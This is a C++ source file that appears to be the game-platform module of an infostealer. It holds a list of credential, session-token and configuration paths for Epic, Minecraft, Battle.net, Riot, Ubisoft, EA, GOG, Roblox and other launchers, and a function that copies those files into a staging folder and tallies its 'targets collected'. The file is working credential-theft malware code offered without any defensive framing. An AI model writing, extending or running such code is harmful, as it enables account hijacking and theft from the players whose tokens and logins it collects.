// Game platforms: Epic, Minecraft, Battle.net, Riot, Ubisoft, EA, GOG, Roblox.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include <sstream>

namespace {

struct GameTarget { const char* name; const char* path; const char* pattern; };

const GameTarget k_game_targets[] = {
    // Epic Games: manifests identify owned games; config holds auth
    {"Epic", "%PROGRAMDATA%\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat", "*"},
    {"Epic config", "%LOCALAPPDATA%\\EpicGamesLauncher\\Saved\\Config\\Windows", "*.ini"},
    {"Epic manifests", "%PROGRAMDATA%\\Epic\\EpicGamesLauncher\\Data\\Manifests", "*.item"},
    {"Epic webcache", "%LOCALAPPDATA%\\EpicGamesLauncher\\Saved\\webcache", "*.json"},
    // Minecraft (launcher_accounts.json = session tokens)
    {"Minecraft", "%APPDATA%\\.minecraft\\launcher_accounts.json", "*"},
    {"Minecraft profiles", "%APPDATA%\\.minecraft\\launcher_profiles.json", "*"},
    {"Minecraft legacy", "%APPDATA%\\.minecraft\\launcher_profiles_microsoft_store.json", "*"},
    {"Minecraft (MS store)", "%LOCALAPPDATA%\\Packages\\Microsoft.4297127D64EC6_8wekyb3d8bbwe\\LocalCache\\Local\\AJG", "*"},
    {"Minecraft HMCL", "%USERPROFILE%\\.hmcl", "*"},
    // Battle.net
    {"Battle.net", "%APPDATA%\\Battle.net\\Battle.net.config", "*"},
    {"Battle.net local", "%LOCALAPPDATA%\\Battle.net", "*"},
    {"Blizzard", "%APPDATA%\\Blizzard Entertainment", "*"},
    // Riot
    {"Riot", "%LOCALAPPDATA%\\Riot Games\\Riot Client\\Data", "*.yaml"},
    {"Riot config", "%APPDATA%\\Riot Games\\Riot Client", "*.yaml"},
    {"League legacy", "%LOCALAPPDATA%\\Riot Games\\League of Legends\\Config", "*"},
    // Ubisoft
    {"Ubisoft", "%LOCALAPPDATA%\\Ubisoft Game Launcher", "*"},
    {"Ubisoft Connect", "%LOCALAPPDATA%\\Ubisoft Game Launcher\\cache\\configuration", "*"},
    // EA / Origin
    {"EA", "%APPDATA%\\EA Desktop", "*"},
    {"Origin", "%APPDATA%\\Origin", "*"},
    {"EA local", "%LOCALAPPDATA%\\Electronic Arts\\EA Desktop", "*"},
    // GOG
    {"GOG Galaxy", "%PROGRAMDATA%\\GOG.com\\Galaxy\\config", "*"},
    {"GOG local", "%LOCALAPPDATA%\\GOG.com\\Galaxy", "*"},
    // Roblox
    {"Roblox", "%LOCALAPPDATA%\\Roblox\\LocalStorage", "*.dat"},
    {"Roblox logs", "%LOCALAPPDATA%\\Roblox\\logs", "*.log"},
    // Others
    {"Supercell", "%LOCALAPPDATA%\\Supercell", "*"},
    {"Osu", "%APPDATA%\\osu", "osu!.db"},
    {"Osu config", "%APPDATA%\\osu", "*.cfg"},
    {"DigitalExtremes", "%LOCALAPPDATA%\\Warframe", "*"},
    {"NCSoft", "%APPDATA%\\NCSoft", "*"},
    {"Rockstar", "%DOCUMENTS%\\Rockstar Games", "*"},
    {"Riot RiotClient", "%LOCALAPPDATA%\\Riot Games\\Metadata", "*"},
};

} // namespace

namespace mod {

void games(const std::string& staging) {
    std::ostringstream summary;
    int hits = 0;
    for (auto& g : k_game_targets) {
        std::string path = util::expand_env(g.path);
        // %DOCUMENTS% is not standard; map it
        if (util::starts_with(g.path, "%DOCUMENTS%")) {
            path = util::join(util::expand_env("%USERPROFILE%"), "Documents");
            std::string rest = std::string(g.path).substr(std::string("%DOCUMENTS%").size());
            if (!rest.empty() && rest[0] == '\\') rest.erase(rest.begin());
            path = util::join(path, rest);
        }
        if (path.empty() || !util::path_exists(path)) continue;
        hits++;
        if (util::is_dir(path)) {
            util::copy_dir_recursive(path, util::join(staging, "games\\" + std::string(g.name)),
                                     {g.pattern}, 32 * 1024 * 1024);
        } else {
            std::vector<uint8_t> data;
            if (util::read_file(path, data) && data.size() < cfg::MAX_GRAB_FILE)
                stage::stage_bytes("games", std::string(g.name) + "_" + util::filename_of(path), data);
        }
        summary << "  " << g.name << ": " << path << "\r\n";
    }
    stage::stage_text("games", "_summary.txt", summary.str());
    stage::note("games", std::to_string(hits) + " targets collected");
}

} // namespace mod
